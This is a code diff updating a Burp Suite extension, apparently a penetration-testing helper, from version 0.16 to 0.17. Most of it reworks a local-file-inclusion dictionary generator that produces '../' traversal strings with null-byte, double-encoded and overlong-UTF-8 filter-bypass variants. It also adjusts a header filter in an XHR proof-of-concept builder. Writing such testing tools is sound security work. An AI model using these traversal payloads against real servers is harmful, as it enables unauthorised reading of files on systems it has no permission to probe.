@@ -16,7 +16,7 @@ try:
 except ImportError:
     print "Failed to load dependencies."
 
-VERSION = "0.16"
+VERSION = "0.17"
 _colorful = True
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
@@ -33,7 +33,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._MainTabs.addTab("Authorization Matrix", None, self._tabAuthSplitpane, None)
         callbacks.addSuiteTab(self)
         callbacks.registerContextMenuFactory(self)
-        callbacks.issueAlert("The extension has been loaded.");
+        callbacks.issueAlert("The extension has been loaded.")
         self.tableMatrixReset(self)
         return
 
@@ -584,11 +584,13 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
     def funcLFI(self, ev):
         listLFI = []
         dept= int(self._cbDictDepth.getSelectedItem())
-        counter = 0        
-
+        
         if self._txtDictParam.text.startswith('/') or self._txtDictParam.text.startswith('\\'):
             self._txtDictParam.text = self._txtDictParam.text[1:]
-            
+        
+        filePath = self._txtDictParam.text.replace("\\","/")
+        
+        counter = 0
         if self._cbDictEquality.isSelected():
             counter = dept
             
@@ -599,43 +601,41 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 _resultTxt += "../"
                 i = i + 1
                 
-            listLFI.append(_resultTxt + self._txtDictParam.text + "\n")
+            listLFI.append(_resultTxt + filePath + "\n")
             
             if self._cbDictEncoding.isSelected():
-
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%00index.html\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%20index.html\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%09index.html\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%0Dindex.html\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%FFindex.html\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%00\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%20\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%09\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%0D\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%FF\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "/..;/\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + ";index.html\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%00.jpg\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%00.jpg\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%20.jpg\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%09.jpg\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%0D.jpg\n")
-                listLFI.append(_resultTxt + self._txtDictParam.text + "%FF.jpg\n")
+                listLFI.append(_resultTxt + filePath + "%00index.html\n")
+                listLFI.append(_resultTxt + filePath + "%20index.html\n")
+                listLFI.append(_resultTxt + filePath + "%09index.html\n")
+                listLFI.append(_resultTxt + filePath + "%0Dindex.html\n")
+                listLFI.append(_resultTxt + filePath + "%FFindex.html\n")
+                listLFI.append(_resultTxt + filePath + "%00\n")
+                listLFI.append(_resultTxt + filePath + "%20\n")
+                listLFI.append(_resultTxt + filePath + "%09\n")
+                listLFI.append(_resultTxt + filePath + "%0D\n")
+                listLFI.append(_resultTxt + filePath + "%FF\n")
+                listLFI.append(_resultTxt + filePath + "/..;/\n")
+                listLFI.append(_resultTxt + filePath + ";index.html\n")
+                listLFI.append(_resultTxt + filePath + "%00.jpg\n")
+                listLFI.append(_resultTxt + filePath + "%00.jpg\n")
+                listLFI.append(_resultTxt + filePath + "%20.jpg\n")
+                listLFI.append(_resultTxt + filePath + "%09.jpg\n")
+                listLFI.append(_resultTxt + filePath + "%0D.jpg\n")
+                listLFI.append(_resultTxt + filePath + "%FF.jpg\n")
 
                 # backslash
                 # replace with /
                 delimetersSlash = ["%2f", "%252f", "%255c", "%c0%af", "%25c0%25af", "%c1%9c", "%25c1%259c", "%%32%66", "%%35%63", "/", "/", "/", "%u2215", "%u2216", "%uEFC8", "%uF025", "0x2f", "%c0%2f", "//", "///", "\\/", "\\/", "%uEFC8", "%uF025", "/\\", "/\\", "//", "%%32%66", "/"]
                 # replace with ..
                 delimetersDots = ["%2e%2e", "%252e%252e", "%252e%252e", "%c0%ae%c0%ae", "%25c0%25ae%25c0%25ae", "%c0%ae%c0%ae", "%25c0%25ae%25c0%25ae", "%%32%65%%32%65", "%%32%65%%32%65", "\\..", "...", "....", "%uff0e%uff0e", "..", "..", "..", "0x2e0x2e", "%c0%2e%c0%2e", "..", "..", "..", "....", "..", "..", "..", "....", "....", "..", "%%32%65%%32%65"]
-                
                 for i in range(len(delimetersSlash)):
-                    listLFI.append((_resultTxt).replace("/", delimetersSlash[i]) + self._txtDictParam.text + "\n")
-                    listLFI.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]) + "/" + self._txtDictParam.text + "\n")
-                    listLFI.append((_resultTxt + self._txtDictParam.text).replace("/", delimetersSlash[i]) + "\n")
-                    listLFI.append((_resultTxt).replace("..", delimetersDots[i]) + self._txtDictParam.text + "\n")
-                    listLFI.append((_resultTxt + self._txtDictParam.text).replace("..", delimetersDots[i]) + "\n")
-                    listLFI.append((_resultTxt).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + self._txtDictParam.text + "\n")
-                    listLFI.append((_resultTxt + self._txtDictParam.text).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "\n")
+                    listLFI.append((_resultTxt).replace("/", delimetersSlash[i]) + filePath + "\n")
+                    listLFI.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]) + "/" + filePath + "\n")
+                    listLFI.append((_resultTxt + filePath).replace("/", delimetersSlash[i]) + "\n")
+                    listLFI.append((_resultTxt).replace("..", delimetersDots[i]) + filePath + "\n")
+                    listLFI.append((_resultTxt + filePath).replace("..", delimetersDots[i]) + "\n")
+                    listLFI.append((_resultTxt).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + filePath + "\n")
+                    listLFI.append((_resultTxt + filePath).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "\n")
                 # backslash
 
                 # forward slash
@@ -643,18 +643,20 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 delimetersSlash = ["%5c", "%255c", "\\", "\\", "\\", "\\\\", "%u2216", "0x5c", "%c0%5c", "\\\\", "\\\\\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "%c1%9c", "\\"]
                 # replace with ..
                 delimetersDots = ["%2e%2e", "%252e%252e", "..", "...", "....", "....", "%uff0e%uff0e", "0x2e0x2e", "%c0%2e%c0%2e", "..", "..", "0x2e0x2e", "%uff0e%uff0e", "%c0%ae%c0%ae", "%c0%2e%c0%2e", "%2e%2e", "%25c0%25ae%25c0%25ae", "%252e%252e", "..", "%c0%ae%c0%ae"] 
-                
                 for i in range(len(delimetersSlash)):
-                    listLFI.append((_resultTxt).replace("/", delimetersSlash[i]) + self._txtDictParam.text + "\n")
-                    listLFI.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]) + "/" + self._txtDictParam.text + "\n")
-                    listLFI.append((_resultTxt + self._txtDictParam.text).replace("/", delimetersSlash[i]) + "\n")
-                    listLFI.append((_resultTxt).replace("..", delimetersDots[i]) + self._txtDictParam.text + "\n")
-                    listLFI.append((_resultTxt + self._txtDictParam.text).replace("..", delimetersDots[i]) + "\n")
-                    listLFI.append((_resultTxt).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + self._txtDictParam.text + "\n")
-                    listLFI.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "/" + self._txtDictParam.text + "\n")
-                    listLFI.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "/" + self._txtDictParam.text + "\n")
-                    listLFI.append((_resultTxt + self._txtDictParam.text).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "\n")
+                    listLFI.append((_resultTxt).replace("/", delimetersSlash[i]) + filePath + "\n")
+                    listLFI.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]) + "/" + filePath + "\n")
+                    listLFI.append((_resultTxt + filePath).replace("/", delimetersSlash[i]) + "\n")
+                    listLFI.append((_resultTxt).replace("..", delimetersDots[i]) + filePath + "\n")
+                    listLFI.append((_resultTxt + filePath).replace("..", delimetersDots[i]) + "\n")
+                    listLFI.append((_resultTxt).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + filePath + "\n")
+                    listLFI.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "/" + filePath + "\n")
+                    listLFI.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "/" + filePath + "\n")
+                    listLFI.append((_resultTxt + filePath).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "\n")
                 # forward slash
+
+                if "\\" in self._txtDictParam.text: 
+                    listLFI.append(_resultTxt + self._txtDictParam.text + "\n")
 
             counter = counter + 1
 
@@ -729,7 +731,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
         fullHeader=""
         for line in _req.splitlines()[1:-1]:
-            if line and not any(re.findall(r'cookie|token|auth|host', line, re.IGNORECASE)):
+            if line and not any(re.findall(r'cookie|token|auth', line, re.IGNORECASE)):
                 fullHeader += "xhr.setRequestHeader('" + line.split(":", 1)[0] + "','" + line.split(":", 1)[1] + "');"
 
         if method == "GET":
